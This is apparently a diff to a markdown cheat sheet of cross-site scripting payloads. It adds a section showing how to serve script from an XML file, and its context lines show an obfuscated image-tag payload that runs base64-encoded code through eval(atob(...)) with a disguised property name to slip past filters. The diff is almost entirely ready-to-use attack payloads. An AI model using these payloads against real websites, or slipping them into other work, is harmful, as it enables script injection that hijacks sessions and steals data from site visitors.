@@ -14,3 +14,11 @@
 6. Now place the base64 encoded payload into the following XSS payload.
 	"><img src=x Onerror="top[8680439..toString(30)](eval(atob('<base64_encoded_payload_here>')))">
 ```
+### Serve XSS payload from a XML file:
+```
+xss.xml:
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
